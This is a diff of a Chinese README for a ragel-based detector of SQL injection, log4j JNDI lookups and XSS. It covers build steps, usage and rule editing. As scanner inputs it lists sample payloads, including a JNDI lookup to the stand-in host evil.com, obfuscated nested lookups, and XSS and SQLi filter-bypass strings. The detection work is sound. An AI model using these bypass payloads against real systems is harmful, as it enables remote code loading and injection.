@@ -1,71 +1,95 @@
 # sql_ragel
 
-用 ragel 把语法写成状态机的小实验。输入先走词法切 token，再在 token 流上跑状态机，识别 SQL 骨架、SQLi 攻击特征、log4j 查找表达式和 XSS 攻击特征。
+用 [ragel](https://www.colm.net/open-source/ragel/) 写的一个小实验：把"判断一段输入是不是攻击 payload"写成状态机。
 
-## 内容
+工作方式就两步：
 
-- `sql_syntax`：SQL 语法骨架，识别 `expr` / `select_stmt` / `constant_value`。
-- `sqli_rules`：24 条 SQLi 攻击规则（恒真条件、布尔注入、UNION/堆叠、危险函数、子查询、语句片段等）。
-- `log4j_lookup`：识别 `${...}` 表达式，按前缀归约分类 JNDI / SENSITIVE / CHAIN / EXPR。
-- `html5_xss_rules`：6 条 XSS 规则（黑标签、黑属性、黑 URL、style 注入、危险注释 + `dangerous_js` 语义分析）。
-- `js_syntax` / `js_danger`：JS 表达式骨架与危险调用检测。
+1. **切词**：把输入切成一个个小片段。比如 `SELECT * FROM a` 切成 `SELECT`、`*`、`FROM`、`a`；`<img onerror=x>` 切成 `<img`、`onerror`、`x`。
+2. **套规则**：拿这些片段去匹配规则，匹配上就说明可疑。
 
-## 目录
+因为全部是状态机，跑得快，也不依赖正则引擎。
 
-```
-src/                 基础设施：词法层 + 共享片段 + 语法骨架
-  sql/               SQL 词法（sql_tokens）+ 共享片段 + 语法骨架
-  log4j/             log4j 查找表达式词法（lookup）
-  html5/             HTML5 词法（tokenizer）+ 共享片段
-  js/                JS 词法 + 共享片段 + 语法骨架 + 危险调用检测
-rules/               检测规则库
-  html5_xss/         XSS 规则（html5_xss_rules + corpus/xss.log）
-  sqli/              SQLi 攻击规则（sqli_rules）
-examples/            调用示例（驱动 + 断言）
-  sql_scan.c         sql 驱动：打印 token 流和骨架命中
-  sqli_scan.c        sqli 驱动
-  log4j_scan.c       log4j 驱动
-  html5_xss_scan.c   html5_xss 驱动
-  js_scan.c          js 驱动
-  test_sql.sh        sql 骨架断言
-  test_sqli.sh       sqli 断言
-  test_log4j.sh      log4j 断言
-  test_html5_xss.sh  html5_xss 断言
-  test_js.sh         js 断言
-Makefile             构建（make / make test）
-CMakeLists.txt       等价 cmake 构建
+## 能干什么
+
+编译完在 `build/ragel/` 下有这几个可执行文件，各自管一类攻击：
+
+| 可执行文件 | 管什么 | 例子 |
+| --- | --- | --- |
+| `sqli_scan` | SQL 注入，24 条规则（恒真条件、UNION 注入、堆叠查询、危险函数等） | `1=1 OR 1=2` |
+| `log4j_scan` | log4j 的 `${...}` 查找表达式 | `${jndi:ldap://evil.com/a}` |
+| `html5_xss_scan` | XSS，6 条规则（黑标签、黑属性、黑 URL、style 注入、危险注释、危险 JS 调用） | `<img onerror=alert(1)>` |
+
+## 跑起来
+
+需要 ragel 和 gcc（Ubuntu/Debian）：
+
+```bash
+sudo apt install ragel gcc make
 ```
 
-约定：`src/` 放可复用的词法/语法基础设施，`rules/` 只放检测规则。
-规则若与共享片段不在同一目录（`sqli_rules` ↔ `sql_shared`、`html5_xss_rules` ↔ `html5_shared`），ragel 生成时需 `-I` 指向 `src/` 对应目录。
+然后：
 
-## 构建与测试
-
-需要 ragel 和 gcc。
-
-```
-make -j        # 构建 sql_scan / sqli_scan / log4j_scan / html5_xss_scan / js_scan
-make test      # 跑五套断言（sql 骨架 / sqli / log4j / html5_xss / js）
+```bash
+make -j        # 编译，产物在 build/ragel/
+make test      # 跑测试
 ```
 
-cmake 等价：
+跑单条输入看看结果：
 
+```bash
+# 普通样本
+./build/ragel/sqli_scan        '1=1 OR 1=2'
+./build/ragel/log4j_scan       '${jndi:ldap://evil.com/a}'
+./build/ragel/html5_xss_scan   '<img onerror=alert(1)>'
+
+# 嵌套样本：括号 / ${} 套了好几层
+./build/ragel/sqli_scan        '(SELECT * FROM (SELECT 1))'
+./build/ragel/log4j_scan       '${lower:${jndi:ldap://x/y}}'
+./build/ragel/html5_xss_scan   '<img onerror=window["constructor"]["constructor"]("alert(1)")()>'
+
+# 绕过样本：注释、编码、拆词拼接
+./build/ragel/sqli_scan        '1=1/**/OR/**/1=2'
+./build/ragel/log4j_scan       '${jn${lower:d}i:ldap://x/a}'
+./build/ragel/html5_xss_scan   '<img src=x onerror="&#97;lert(1)">'
 ```
+
+最后一组考验的是"能不能看懂内容"：SQL 里 `/**/` 是注释要跳过去、`&#97;` 就是字母 `a`、`${lower:d}` 归约成 `d`。只照着字符串硬比对的话，这三条都拦不住。
+
+输出会先打印切出来的词，再打印命中的规则：`sqli_scan` 和 `html5_xss_scan` 的行首是 `!!`，`log4j_scan` 是 `[JNDI]` 这样的分类标签。`make test` 输出的是 `[PASS]` / `[FAIL]` 加最后一行总结。
+
+不想用 make 也可以用 cmake：
+
+```bash
 cmake -S . -B build && cmake --build build -j
 cmake --build build --target validate_ragel
 ```
 
-## 运行
+## 目录
 
 ```
-./build/ragel/sql_scan  'SELECT * FROM users WHERE 1=1'
-./build/ragel/sqli_scan '1=1 OR 1=2'
-./build/ragel/log4j_scan '${jndi:ldap://evil.com/a}'
-./build/ragel/html5_xss_scan  '<img onerror=alert(1)>'
+src/            底座：切词 + 语法骨架，各模块共用
+  sql/          SQL 的切词、语法骨架
+  html5/        HTML 的切词
+  js/           JS 的切词、语法骨架、危险调用检测
+  log4j/        log4j 的切词
+rules/          规则：真正判"是不是攻击"的地方
+  html5_xss/    XSS 规则，corpus/xss.log 是攒的样本
+  sqli/         SQL 注入规则
+examples/       每个模块一个驱动（*_scan.c）+ 一套测试脚本（test_*.sh）
+build/          编译产物，git 不跟踪
 ```
 
-## 说明
+一句话：**`src/` 是工具，`rules/` 是规则。** 想调检测效果，基本只改 `rules/`。
 
-- 规则只改 `.rl`，重新构建即可；生成的 C 是中间产物，不要手工改。
-- 驱动只 include 头文件并链接 `libragel_sql.a`，不接触生成的 `.c`。
-- 递归（括号嵌套、子查询）用 ragel 的 fcall/fret 实现，见各 `.rl` 头注释。
+## 改规则
+
+- 规则写在 `rules/` 下对应模块的 `.rl` 文件里，改完 `make` 重新编译就生效。
+- `build/ragel/gen/*.c` 是 ragel 从 `.rl` 生成的代码，是中间产物，别去看也别手改。
+- 每个模块的测试在 `examples/test_*.sh`，是纯 bash 的断言脚本。加了规则记得顺手加两条用例。
+- 规则文件会 include `src/` 下的共享片段，两者不在同一个目录，所以 ragel 生成时加了 `-I` 指向 `src/`。这部分写在 `Makefile` 和 `CMakeLists.txt` 里。
+
+## 几个说明
+
+- 驱动（`examples/*.c`）只 include 头文件、链接 `libragel_sql.a`，不直接碰生成的 `.c`。
+- 括号嵌套、子查询这类需要递归的地方，用的是 ragel 的 `fcall` / `fret`，细节写在对应 `.rl` 的开头注释里。
+- 只跑 `make` 不跑 `make test` 时，`.rl` 改了也会自动重新生成，不会用到旧产物。
